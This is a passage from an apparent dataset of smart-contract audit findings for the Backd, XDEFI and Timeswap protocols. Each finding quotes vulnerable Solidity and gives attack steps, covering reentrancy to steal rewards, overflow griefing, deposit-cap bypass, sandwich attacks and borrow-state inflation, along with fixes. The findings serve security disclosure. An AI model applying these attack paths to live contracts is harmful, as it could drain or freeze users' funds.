File: backd/contracts/actions/topup/TopUpAction.sol   #1

36       function lockFunds(
37           address stakerVaultAddress,
38           address payer,
39           address token,
40           uint256 lockAmount,
41           uint256 depositAmount
42       ) external {
43           uint256 amountLeft = lockAmount;
44           IStakerVault stakerVault = IStakerVault(stakerVaultAddress);
45   
46           // stake deposit amount
47           if (depositAmount > 0) {
48               depositAmount = depositAmount > amountLeft ? amountLeft : depositAmount;
49               IERC20(token).safeTransferFrom(payer, address(this), depositAmount);
50               IERC20(token).safeApprove(stakerVaultAddress, depositAmount);
```

[TopUpAction.sol#L36-L50](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L36-L50)<br>

The changing of either the staker or an lp token is behind a time-lock, and once the time has passed, the changed variables rely on this function:

```solidity
File: backd/contracts/pool/LiquidityPool.sol   #2

717       function _approveStakerVaultSpendingLpTokens() internal {
718           address staker_ = address(staker);
719           address lpToken_ = address(lpToken);
720           if (staker_ == address(0) || lpToken_ == address(0)) return;
721           IERC20(lpToken_).safeApprove(staker_, type(uint256).max);
722       }
```

[LiquidityPool.sol#L717-L722](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/LiquidityPool.sol#L717-L722)<br>

If a bug is found in a new `staker` or `lpToken` and the governor wishes to change back to the old one(s), the governor will have to wait for the time-lock delay only to find out that the old value(s) cause the code to revert.

I've filed the other more-severe instances as a separate high-severity issue, and flagged the remaining low-severity instances in my QA report.

### Recommended Mitigation Steps

Always do `safeApprove(0)` if the allowance is being changed, or use `safeIncreaseAllowance()`.




 resolved



***"
112.md,`CvxCrvRewardsLocker` implements a swap without a slippage check that can result in a loss of funds through MEV,medium,"The CvxCrvRewardsLocker contract swaps tokens through the CRV cvxCRV pool. But, it doesn't use any slippage checks. The swap is at risk of being frontrun / sandwiched which will result in a loss of funds.

Since MEV is very prominent I think the chance of that happening is pretty high.

### Proof of Concept

Here's the swap: [CvxCrvRewardsLocker.sol#L247-L252](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/CvxCrvRewardsLocker.sol#L247-L252).

### Recommended Mitigation Steps

Use a proper value for `minOut` instead of `0`.






***"
112.md,Chainlink's `latestRoundData` might return stale or incorrect results,medium,"On ChainlinkOracleProvider.sol and ChainlinkUsdWrapper.sol , we are using latestRoundData, but there is no check if the return value indicates stale data.
```solidity
    function _ethPrice() private view returns (int256) {
        (, int256 answer, , , ) = _ethOracle.latestRoundData();
        return answer;
    }
...
    function getPriceUSD(address asset) public view override returns (uint256) {
        address feed = feeds[asset];
        require(feed != address(0), Error.ASSET_NOT_SUPPORTED);

        (, int256 answer, , uint256 updatedAt, ) = AggregatorV2V3Interface(feed).latestRoundData();

        require(block.timestamp <= updatedAt + stalePriceDelay, Error.STALE_PRICE);
        require(answer >= 0, Error.NEGATIVE_PRICE);

        uint256 price = uint256(answer);
        uint8 decimals = AggregatorV2V3Interface(feed).decimals();
        return price.scaleFrom(decimals);
    }
```

This could lead to stale prices according to the Chainlink documentation:

<https://docs.chain.link/docs/historical-price-data/#historical-rounds><br>
<https://docs.chain.link/docs/faq/#how-can-i-check-if-the-answer-to-a-round-is-being-carried-over-from-a-previous-round>

### Proof of Concept

[ChainlinkOracleProvider.sol#L55](https://github.com/code-423n4/2022-04-backd/blob/main/backd/contracts/oracles/ChainlinkOracleProvider.sol#L55)<br>
[ChainlinkUsdWrapper.sol#L64](https://github.com/code-423n4/2022-04-backd/blob/main/backd/contracts/oracles/ChainlinkUsdWrapper.sol#L64)

### Recommended Mitigation Steps
```solidity
    function _ethPrice() private view returns (int256) {
        (uint80 roundID, int256 answer, , uint256 timestamp, uint80 answeredInRound) = _ethOracle.latestRoundData();
        require(answeredInRound >= roundID, ""Stale price"");
        require(timestamp != 0,""Round not complete"");
        require(answer > 0,""Chainlink answer reporting 0"");
        return answer;
    }
...
    function getPriceUSD(address asset) public view override returns (uint256) {
        address feed = feeds[asset];
        require(feed != address(0), Error.ASSET_NOT_SUPPORTED);
        (uint80 roundID, int256 answer, , uint256 updatedAt, uint80 answeredInRound) = AggregatorV2V3Interface(feed).latestRoundData();
        require(answeredInRound >= roundID, ""Stale price"");
        require(answer > 0,"" Error.NEGATIVE_PRICE"");
        require(block.timestamp <= updatedAt + stalePriceDelay, Error.STALE_PRICE);

        uint256 price = uint256(answer);
        uint8 decimals = AggregatorV2V3Interface(feed).decimals();
        return price.scaleFrom(decimals);
    }
```





***"
112.md,ERC777 tokens can bypass `depositCap` guard,medium,"[LiquidityPool.sol#L523](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/LiquidityPool.sol#L523)<br>

When ERC777 token is used as the underlying token for a `LiquidityPool`, a depositor can reenter `depositFor` and bypass the `depositCap` requirement check, resulting in higher total deposit than intended by governance.

### Proof of Concept

*   An empty ERC777 liquidity pool is capped at 1.000 token.
*   Alice deposits 1.000 token. Before the token is actually sent to the contract, `tokensToSend` ERC777 hook is called and Alice reenters `depositFor`.
*   As the previous deposit hasn't been taken into account, the reentrancy passes the `depositCap` check.
*   Pool has 2.000 token now, despite the 1.000 deposit cap.

### Recommended Mitigation Steps

Add reentrancy guards to `depositFor`.





***"
112.md,Inconsistency between constructor and setting method for `slippageTolerance`,medium,"[StrategySwapper.sol#L38-L43](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/StrategySwapper.sol#L38-L43)<br>
[StrategySwapper.sol#L109-L114](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/StrategySwapper.sol#L109-L114)<br>

In the setSlippageTolerance(L119) method you have certain requirements to set slippageTolerance, but in the constructor you don't.

### Recommended Mitigation Steps

I would add the corresponding validations to the constructor.





***"
112.md,`_decimalMultiplier` doesn't account for tokens with decimals higher than 18,medium,"[StrategySwapper.sol#L287-L289](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/StrategySwapper.sol#L287-L289)<br>
[StrategySwapper.sol#L318-L320](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/StrategySwapper.sol#L318-L320)<br>
[StrategySwapper.sol#L335-L337](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/StrategySwapper.sol#L335-L337)<br>

In `StrategySwapper`, swapping from or to tokens with decimals higher than 18 will always revert. This will cause inabilities for strategies to harvest rewards.

### Proof of Concept

[L288](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/StrategySwapper.sol#L288) will revert when `token_` has higher than 18 decimals.

     return 10**(18 - IERC20Full(token_).decimals());

### Recommended Mitigation Steps

Consider modifying how `_decimalMultiplier` works so it could handle tokens with higher than 18 decimals.

Update the calculation of `_minTokenAmountOut` and `_minWethAmountOut` to account when decimals are higher/lower than `18`.





***"
112.md,`getNewCurrentFees` reverts when `minFeePercentage` > `feeRatio`,medium,"[LiquidityPool.sol#L694](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/LiquidityPool.sol#L694)<br>

Depositors won't be able to transfer or redeem funds temporarily.

The problem is caused by the implementation of `LiquidityPool.getNewCurrentFees`:
```solidity
function getNewCurrentFees(
    uint256 timeToWait,
    uint256 lastActionTimestamp,
    uint256 feeRatio
) public view returns (uint256) {
    uint256 timeElapsed = _getTime() - lastActionTimestamp;
    uint256 minFeePercentage = getMinWithdrawalFee();
    if (timeElapsed >= timeToWait) {
        return minFeePercentage;
    }
    uint256 elapsedShare = timeElapsed.scaledDiv(timeToWait);
    return feeRatio - (feeRatio - minFeePercentage).scaledMul(elapsedShare);
}
```

The last line requires the current `feeRatio` to be higher than `minFeePercentage` or the function will revert. When this condition is broken, some critical functions such as transferring tokens and redeeming will be unusable. Affected users need to wait until enough time has elapsed and `getNewCurrentFees` returns `minFeePercentage` on [L691](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/LiquidityPool.sol#L691).

This could happen if governance changes the `MinWithdrawalFee` to be higher than a user's feeRatio.

### Proof of Concept

*   Initial `MinWithdrawalFee` is set to 0, `MaxWithdrawalFee` is set to 0.03e18.
*   Alice deposits fund and receives LP token. Alice's `feeRatio` is now set to 0.03e18 (the current `MaxWithdrawalFee`).
*   Governance changes `MaxWithdrawalFee` to `0.05e18` and `MinWithdrawalFee` to `0.04e18`.
*   `minFeePercentage` is now higher than Alice's `feeRatio` and she can't transfer nor redeem the LP token until `timeElapsed >= timeToWait`.

### Recommended Mitigation Steps

Add a new condition in `getNewCurrentFees` [L690](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/LiquidityPool.sol#L690) to account for this case:

```solidity
if (timeElapsed >= timeToWait || minFeePercentage > feeRatio) {
    return minFeePercentage;
}
```





***"
112.md,Griefer can extend period of higher withdrawal fees,medium,"[LiquidityPool.sol#L790-L792](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/LiquidityPool.sol#L790-L792)<br>

The `_updateUserFeesOnDeposit()` function in `LiquidityPool.sol` is used to update a user's withdrawal fees after an action such as deposit, transfer in, etc. The withdrawal fee decays toward a minimum withdrawal fee over a period of 1 or 2 weeks (discussed with developer). Since anyone can transfer lp tokens to any user, a griefer can transfer 1 wei of lp tokens to another user to reset their `lastActionTimestamp` used in the withdrawal fee calculation.

The developers nicely weight the updated withdrawal fee by taking the original balance/original fee vs the added balance/added fee. The attacker will only be able to extend the runway of the withdrawal fee cooldown by resetting the `lastActionTimestamp` for future calculations. Example below:

### Proof of Concept
Assumptions:
- MinWithdrawalFee = 0% //For easy math
- MaxWithdrawalFee = 10%
- timeToWait = 2 weeks

#### Steps
- User A has `100 wei` of shares
- User A waits 1 week (Current withdrawal fee = 5%)
- User B deposits, receives `1 wei` of shares, current withdrawal fee = 10%
- User B immediately transfers `1 wei` of shares to User A

Based on the formula to calculated User A's new feeRatio:

```solidity
uint256 newFeeRatio = shareExisting.scaledMul(newCurrentFeeRatio) +
    shareAdded.scaledMul(feeOnDeposit);
```

In reality, User A's withdrawal fee will only increase by a negligible amount since the shares added were very small in proportion to the original shares. We can assume user A's current withdrawal fee is still 5%.

The issue is that the function then reset's User A's `lastActionTimestamp` to the current time. This means that User A will have to wait the maximum 2 weeks for the withdrawal fee to reduce from 5% to 0%. Effectively the cooldown runway is the same length as the original runway length, so the decay down to 0% will take twice as long.

`meta.lastActionTimestamp = uint64(_getTime());`

### Recommended Mitigation Steps
Instead of resetting `lastActionTimestamp` to the current time, scale it the same way the `feeRatio` is scaled. I understand that this would technically not be the timestamp of the last action, so the variable would probably need to be renamed.





***"
112.md,Position owner should set allowed slippage,medium,"[TopUpAction.sol#L154](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L154)<br>
[TopUpAction.sol#L187](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L187)<br>

The default swap slippage of 5% allows malicious keepers to sandwich attack topup. Additionally, up to 40% (\_MIN_SWAPPER_SLIPPAGE) slippage allows malicious owner to sandwich huge amounts from topup

### Proof of Concept

Keeper can bundle swaps before and after topup to sandwich topup action, in fact it's actually in their best interest to do so.

### Recommended Mitigation Steps

Allow user to specify max swap slippage when creating topup similar to how it's specified on uniswap or sushiswap to block attacks from both keepers and owners.






***"
112.md,`CompoundHandler#topUp()` Using the wrong function selector makes native token `topUp()` always revert,medium,"[compound-finance/CEther.sol#L44-L47](https://github.com/compound-finance/compound-protocol/blob/v2.8.1/contracts/CEther.sol#L44-L47)<br>

```solidity
function mint() external payable {
    (uint err,) = mintInternal(msg.value);
    requireNoError(err, ""mint failed"");
}
```

`mint()` for native cToken (`CEther`) does not have any parameters, as the `Function Selector` is based on `the function name with the parenthesised list of parameter types`, when you add a nonexisting `parameter`, the `Function Selector` will be incorrect.

[CTokenInterfaces.sol#L316](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/interfaces/vendor/CTokenInterfaces.sol#L316)<br>

```solidity
function mint(uint256 mintAmount) external payable virtual returns (uint256);
```

The current implementation uses the same `CToken` interface for both `CEther` and `CErc20` in `topUp()`, and `function mint(uint256 mintAmount)` is a nonexisting function for `CEther`.

As a result, the native token `topUp()` always revert.

[CompoundHandler.sol#L57-L70](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/CompoundHandler.sol#L57-L70)<br>

```solidity
CToken ctoken = cTokenRegistry.fetchCToken(underlying);
uint256 initialTokens = ctoken.balanceOf(address(this));

address addr = account.addr();

if (repayDebt) {
    amount -= _repayAnyDebt(addr, underlying, amount, ctoken);
    if (amount == 0) return true;
}

uint256 err;
if (underlying == address(0)) {
    err = ctoken.mint{value: amount}(amount);
}
```

See also:

*   [Compound's cToken mint doc](https://compound.finance/docs/ctokens#mint)





***"
112.md,`CEthInterface#repayBorrowBehalf()` reading non-existing returns makes  `_repayAnyDebt()` with CEther always revert,medium,"[CTokenInterfaces.sol#L355-L358](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/interfaces/vendor/CTokenInterfaces.sol#L355-L358)<br>

```solidity
function repayBorrowBehalf(address borrower, uint256 repayAmount)
        external
        payable
        returns (uint256);
```

`repayBorrowBehalf()` for native cToken (`CEther`) will return nothing, while the current `CEthInterface` interface defines the returns as `(uint256)`.

As a result, `ether.repayBorrowBehalf()` will always revert

[CompoundHandler.sol#L117-L118](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/CompoundHandler.sol#L117-L118)<br>

```solidity
CEther cether = CEther(address(ctoken));
err = cether.repayBorrowBehalf{value: debt}(account);
```

Ref:

| method              | CEther     | CErc20     |
| ------------------- | ---------- | ---------- |
| mint()              | revert     | error code |
| redeem()            | error code | error code |
| repayBorrow()       | revert     | error code |
| repayBorrowBehalf() | revert     | error code |

*   [Compound cToken Repay Borrow Behalf doc](https://compound.finance/docs/ctokens#repay-borrow-behalf)
*   [Compound CEther.repayBorrowBehalf()](https://github.com/compound-finance/compound-protocol/blob/v2.8.1/contracts/CEther.sol#L92-L95)
*   [Compound CErc20.repayBorrowBehalf()](https://github.com/compound-finance/compound-protocol/blob/v2.8.1/contracts/CErc20.sol#L94-L97)





***"
112.md,`CEthInterface#mint()` reading non-existing returns makes `topUp()` with native token always revert,medium,"[CTokenInterfaces.sol#L345](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/interfaces/vendor/CTokenInterfaces.sol#L345)<br>

```solidity
function mint() external payable returns (uint256);
```

`mint()` for native cToken (`CEther`) will return nothing, while the current `CEthInterface` interface defines the returns as `(uint256)`.

In the current implementation, the interface for `CToken` is used for both `CEther` and `CErc20`.

As a result, the transaction will revert with the error: `function returned an unexpected amount of data` when `topUp()` with the native token (ETH).

[CompoundHandler.sol#L57-L70](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/CompoundHandler.sol#L57-L70)<br>

```solidity
    CToken ctoken = cTokenRegistry.fetchCToken(underlying);
    uint256 initialTokens = ctoken.balanceOf(address(this));

    address addr = account.addr();

    if (repayDebt) {
        amount -= _repayAnyDebt(addr, underlying, amount, ctoken);
        if (amount == 0) return true;
    }

    uint256 err;
    if (underlying == address(0)) {
        err = ctoken.mint{value: amount}(amount);
    }
```

Ref:

| method  | CEther | CErc20 |
|----------|------------|-------------|
| mint()   | revert      | error code  |
| redeem() | error code | error code  |
| repayBorrow() | revert | error code  |
| repayBorrowBehalf() | revert | error code  |

- [Compound's cToken mint doc](https://compound.finance/docs/ctokens#mint)<br>
- [Compound CEther.mint()](https://github.com/compound-finance/compound-protocol/blob/v2.8.1/contracts/CEther.sol#L46)<br>
- [Compound CErc20.mint()](https://github.com/compound-finance/compound-protocol/blob/v2.8.1/contracts/CErc20.sol#L46)<br>





***"
112.md,Malicious Stakers can grief Keepers,medium,"A Staker -- that has their top-up position removed after `execute` is called by a Keeper -- can always cause the transaction to revert. They can do this by deploying a smart contract to the `payer` address that has implemented a `receive()` function that calls `revert()`. The revert will be triggered by the following [lines](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L727-L729) in `execute`

```solidity
if (vars.removePosition) {
    gasBank.withdrawUnused(payer);
}
```

This will consume some gas from the keeper while preventing them accruing any rewards for performing the top-up action.

### Proof of Concept

I have implemented a [PoC](https://github.com/sseefried/codearena-backd-2022-04/blob/4d3c3ba7a0139bea01a0bdee9e84a7921572a9fd/backd/tests/top_up_action/sseefried_test_staker_grief.py) in a fork of the contest repo. The attacker's contract can be found [here](https://github.com/sseefried/codearena-backd-2022-04/blob/4d3c3ba7a0139bea01a0bdee9e84a7921572a9fd/backd/contracts/AliceAttacker.sol).

### Recommend Mitigation Steps

To prevent this denial of service attack some way of blacklisting badly behaved Stakers should be added.





***"
75.md,Malicious early user/attacker can malfunction the contract and even freeze users' funds in edge cases,high,"<https://github.com/XDeFi-tech/xdefi-distribution/blob/3856a42df295183b40c6eee89307308f196612fe/contracts/XDEFIDistribution.sol#L151-L151>

```solidity
_pointsPerUnit += ((newXDEFI * _pointsMultiplier) / totalUnitsCached);
```

In the current implementation,  `_pointsPerUnit` can be changed in `updateDistribution()` which can be called by anyone.

A malicious early user can `lock()` with only `1 wei` of XDEFI and makes `_pointsPerUnit` to be very large, causing future users not to be able to `lock()` and/or `unlock()` anymore due to overflow in arithmetic related to `_pointsMultiplier`.

As a result, the contract can be malfunctioning and even freeze users' funds in edge cases.

#### Proof of Concept

Given:

*   bonusMultiplierOf\[30 days] = 100

1.  Alice `lock()` `1 wei` of XDEFI for 30 days as the first user of the contract. Got `1` units, and `totalUnits` now is `1`;
2.  Alice sends `170141183460469 wei` of `XDEFI` to the contract and calls `updateDistribution()`:

```solidity
_pointsPerUnit += ((170141183460469 * 2**128) / 1);
```

3.  Bob tries to `lock()` `1,100,000 * 1e18` of `XDEFI` for 30 days, the tx will fail, as `_pointsPerUnit * units` overlows;
4.  Bob `lock()` `1,000,000 * 1e18` of `XDEFI` for 30 days;
5.  The rewarder sends `250,000 * 1e18` of `XDEFI` to the contract and calls `updateDistribution()`:

```solidity
_pointsPerUnit += ((250_000 * 1e18 * 2**128) / (1_000_000 * 1e18 + 1));
```

6.  30 days later, Bob tries to call `unlock()`, the tx will fail, as `_pointsPerUnit * units` overflows.

#### Recommended Mitigation Steps

Uniswap v2 solved a similar problem by sending the first 1000 lp tokens to the zero address.

The same solution should work here, i.e., on constructor set an initial amount (like 1e8) for `totalUnits`

<https://github.com/XDeFi-tech/xdefi-distribution/blob/3856a42df295183b40c6eee89307308f196612fe/contracts/XDEFIDistribution.sol#L39-L44>

```solidity
constructor (address XDEFI_, string memory baseURI_, uint256 zeroDurationPointBase_) ERC721(""Locked XDEFI"", ""lXDEFI"") {
    require((XDEFI = XDEFI_) != address(0), ""INVALID_TOKEN"");
    owner = msg.sender;
    baseURI = baseURI_;
    _zeroDurationPointBase = zeroDurationPointBase_;

    totalUnits = 100_000_000;
}
```"
75.md,The reentrancy vulnerability in _safeMint can allow an attacker to steal all rewards,high,"There is a reentrancy vulnerability in the \_safeMint function
```solidity
function _safeMint(
    address to,
    uint256 tokenId,
    bytes memory _data
) internal virtual {
    _mint(to, tokenId);
    require(
        _checkOnERC721Received(address(0), to, tokenId, _data),
        ""ERC721: transfer to non ERC721Receiver implementer""
    );
}
...
function _checkOnERC721Received(
    address from,
    address to,
    uint256 tokenId,
    bytes memory _data
) private returns (bool) {
    if (to.isContract()) {
        try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
            return retval == IERC721Receiver.onERC721Received.selector;
```
The lock function changes the totalDepositedXDEFI variable after calling the \_safeMint function
```solidity
function lock(uint256 amount_, uint256 duration_, address destination_) external noReenter returns (uint256 tokenId_) {
    // Lock the XDEFI in the contract.
    SafeERC20.safeTransferFrom(IERC20(XDEFI), msg.sender, address(this), amount_);

    // Handle the lock position creation and get the tokenId of the locked position.
    return _lock(amount_, duration_, destination_);
}
...
    function _lock(uint256 amount_, uint256 duration_, address destination_) internal returns (uint256 tokenId_) {
    // Prevent locking 0 amount in order generate many score-less NFTs, even if it is inefficient, and such NFTs would be ignored.
    require(amount_ != uint256(0) && amount_ <= MAX_TOTAL_XDEFI_SUPPLY, ""INVALID_AMOUNT"");

    // Get bonus multiplier and check that it is not zero (which validates the duration).
    uint8 bonusMultiplier = bonusMultiplierOf[duration_];
    require(bonusMultiplier != uint8(0), ""INVALID_DURATION"");

    // Mint a locked staked position NFT to the destination.
    _safeMint(destination_, tokenId_ = _generateNewTokenId(_getPoints(amount_, duration_)));

    // Track deposits.
    totalDepositedXDEFI += amount_;
```

Since the updateDistribution function does not use the noReenter modifier, the attacker can re-enter the updateDistribution function in the \_safeMint function. Since the value of totalDepositedXDEFI is not updated at this time, the \_pointsPerUnit variable will become abnormally large.

```solidity
    function updateDistribution() external {
       uint256 totalUnitsCached = totalUnits;

       require(totalUnitsCached> uint256(0), ""NO_UNIT_SUPPLY"");

       uint256 newXDEFI = _toUint256Safe(_updateXDEFIBalance());

       if (newXDEFI == uint256(0)) return;

       _pointsPerUnit += ((newXDEFI * _pointsMultiplier) / totalUnitsCached);

       emit DistributionUpdated(msg.sender, newXDEFI);
   }
   ...
   function _updateXDEFIBalance() internal returns (int256 newFundsTokenBalance_) {
       uint256 previousDistributableXDEFI = distributableXDEFI;
       uint256 currentDistributableXDEFI = distributableXDEFI = IERC20(XDEFI).balanceOf(address(this))-totalDepositedXDEFI;

       return _toInt256Safe(currentDistributableXDEFI)-_toInt256Safe(previousDistributableXDEFI);
   }

```

If the attacker calls the lock function to get the NFT before exploiting the reentrance vulnerability, then the unlock function can be called to steal a lot of rewards, and the assets deposited by the user using the reentrance vulnerability can also be redeemed by calling the unlock function. Since the unlock function calls the \_updateXDEFIBalance function, the attacker cannot steal the assets deposited by the user
```solidity

function unlock(uint256 tokenId_, address destination_) external noReenter returns (uint256 amountUnlocked_) {
    // Handle the unlock and get the amount of XDEFI eligible to withdraw.
    amountUnlocked_ = _unlock(msg.sender, tokenId_);

    // Send the the unlocked XDEFI to the destination.
    SafeERC20.safeTransfer(IERC20(XDEFI), destination_, amountUnlocked_);

    // NOTE: This needs to be done after updating `totalDepositedXDEFI` (which happens in `_unlock`) and transferring out.
    _updateXDEFIBalance();
}
...
function _unlock(address account_, uint256 tokenId_) internal returns (uint256 amountUnlocked_) {
    // Check that the account is the position NFT owner.
    require(ownerOf(tokenId_) == account_, ""NOT_OWNER"");

    // Fetch position.
    Position storage position = positionOf[tokenId_];
    uint96 units = position.units;
    uint88 depositedXDEFI = position.depositedXDEFI;
    uint32 expiry = position.expiry;

    // Check that enough time has elapsed in order to unlock.
    require(expiry != uint32(0), ""NO_LOCKED_POSITION"");
    require(block.timestamp >= uint256(expiry), ""CANNOT_UNLOCK"");

    // Get the withdrawable amount of XDEFI for the position.
    amountUnlocked_ = _withdrawableGiven(units, depositedXDEFI, position.pointsCorrection);

    // Track deposits.
    totalDepositedXDEFI -= uint256(depositedXDEFI);

    // Burn FDT Position.
    totalUnits -= units;
    delete positionOf[tokenId_];

    emit LockPositionWithdrawn(tokenId_, account_, amountUnlocked_);
}
...
function _withdrawableGiven(uint96 units_, uint88 depositedXDEFI_, int256 pointsCorrection_) internal view returns (uint256 withdrawableXDEFI_) {
    return
        (
            _toUint256Safe(
                _toInt256Safe(_pointsPerUnit * uint256(units_)) +
                pointsCorrection_
            ) / _pointsMultiplier
        ) + uint256(depositedXDEFI_);
}
```

#### Proof of Concept

<https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-beta.0/contracts/XDEFIDistribution.sol#L253-L281>

#### Recommended Mitigation Steps

    -    function updateDistribution() external  {
    +    function updateDistribution() external  noReenter {"
75.md,`_safeMint` Will Fail Due To An Edge Case In Calculating `tokenId` Using The `_generateNewTokenId` Function,medium,"#### Impact

NFTs are used to represent unique positions referenced by the generated `tokenId`. The `tokenId` value contains the position's score in the upper 128 bits and the index wrt. the token supply in the lower 128 bits.

When positions are unlocked after expiring, the relevant position stored in the `positionOf` mapping is deleted, however, the NFT is not. The `merge()` function is used to combine points in unlocked NFTs, burning the underlying NFTs upon merging. As a result, `_generateNewTokenId()` may end up using the same `totalSupply()` value, causing `_safeMint()` to fail if the same `amount_` and `duration_` values are used.

This edge case only occurs if there is an overlap in the `points_` and `totalSupply() + 1` values used to generate `tokenId`. As a result, this may impact a user's overall experience while interacting with the `XDEFI` protocol, as some transactions may fail unexpectedly.

#### Proof of Concept
```solidity
function _lock(uint256 amount_, uint256 duration_, address destination_) internal returns (uint256 tokenId_) {
    // Prevent locking 0 amount in order generate many score-less NFTs, even if it is inefficient, and such NFTs would be ignored.
    require(amount_ != uint256(0) && amount_ <= MAX_TOTAL_XDEFI_SUPPLY, ""INVALID_AMOUNT"");

    // Get bonus multiplier and check that it is not zero (which validates the duration).
    uint8 bonusMultiplier = bonusMultiplierOf[duration_];
    require(bonusMultiplier != uint8(0), ""INVALID_DURATION"");

    // Mint a locked staked position NFT to the destination.
    _safeMint(destination_, tokenId_ = _generateNewTokenId(_getPoints(amount_, duration_)));

    // Track deposits.
    totalDepositedXDEFI += amount_;

    // Create Position.
    uint96 units = uint96((amount_ * uint256(bonusMultiplier)) / uint256(100));
    totalUnits += units;
    positionOf[tokenId_] =
        Position({
            units: units,
            depositedXDEFI: uint88(amount_),
            expiry: uint32(block.timestamp + duration_),
            created: uint32(block.timestamp),
            bonusMultiplier: bonusMultiplier,
            pointsCorrection: -_toInt256Safe(_pointsPerUnit * units)
        });

    emit LockPositionCreated(tokenId_, destination_, amount_, duration_);
}
```
```solidity
function _generateNewTokenId(uint256 points_) internal view returns (uint256 tokenId_) {
    // Points is capped at 128 bits (max supply of XDEFI for 10 years locked), total supply of NFTs is capped at 128 bits.
    return (points_ << uint256(128)) + uint128(totalSupply() + 1);
}
```

```solidity
function merge(uint256[] memory tokenIds_, address destination_) external returns (uint256 tokenId_) {
    uint256 count = tokenIds_length;
    require(count > uint256(1), ""MIN_2_TO_MERGE"");

    uint256 points;

    // For each NFT, check that it belongs to the caller, burn it, and accumulate the points.
    for (uint256 i; i < count; ++i) {
        uint256 tokenId = tokenIds_[i];
        require(ownerOf(tokenId) == msg.sender, ""NOT_OWNER"");
        require(positionOf[tokenId].expiry == uint32(0), ""POSITION_NOT_UNLOCKED"");

        _burn(tokenId);

        points += _getPointsFromTokenId(tokenId);
    }

    // Mine a new NFT to the destinations, based on the accumulated points.
    _safeMint(destination_, tokenId_ = _generateNewTokenId(points));
}
```

#### Recommended Mitigation Steps

Consider replacing `totalSupply()` in `_generateNewTokenId()` with an internal counter. This should ensure that `_generateNewTokenId()` always returns a unique `tokenId` that is monotomically increasing ."
74.md,`TimeswapPair.sol#borrow()` Improper implementation allows attacker to increase `pool.state.z` to a large value,high,"In the current implementation, `borrow()` takes a user input value of `zIncrease`, while the actual collateral asset transferred in is calculated at L319, the state of `pool.state.z` still increased by the value of the user's input at L332.

Even though a large number of `zIncrease` means that the user needs to add more collateral, the attacker can use a dust amount `xDecrease` (1 wei for example) so that the total collateral needed is rather small.

Plus, the attacker can always `pay()` the dust amount of loan to get back the rather large amount of collateral added.

<https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L299-L338>

```solidity
function borrow(
    uint256 maturity,
    address assetTo,
    address dueTo,
    uint112 xDecrease,
    uint112 yIncrease,
    uint112 zIncrease,
    bytes calldata data
) external override lock returns (uint256 id, Due memory dueOut) {
    require(block.timestamp < maturity, 'E202');
    require(assetTo != address(0) && dueTo != address(0), 'E201');
    require(assetTo != address(this) && dueTo != address(this), 'E204');
    require(xDecrease > 0, 'E205');

    Pool storage pool = pools[maturity];
    require(pool.state.totalLiquidity > 0, 'E206');

    BorrowMath.check(pool.state, xDecrease, yIncrease, zIncrease, fee);

    dueOut.debt = BorrowMath.getDebt(maturity, xDecrease, yIncrease);
    dueOut.collateral = BorrowMath.getCollateral(maturity, pool.state, xDecrease, zIncrease);
    dueOut.startBlock = BlockNumber.get();

    Callback.borrow(collateral, dueOut.collateral, data);

    id = pool.dues[dueTo].insert(dueOut);

    pool.state.reserves.asset -= xDecrease;
    pool.state.reserves.collateral += dueOut.collateral;
    pool.state.totalDebtCreated += dueOut.debt;

    pool.state.x -= xDecrease;
    pool.state.y += yIncrease;
    pool.state.z += zIncrease;

    asset.safeTransfer(assetTo, xDecrease);

    emit Sync(maturity, pool.state.x, pool.state.y, pool.state.z);
    emit Borrow(maturity, msg.sender, assetTo, dueTo, xDecrease, id, dueOut);
}
```

<https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/BorrowMath.sol#L62-L79>

```solidity
function getCollateral(
    uint256 maturity,
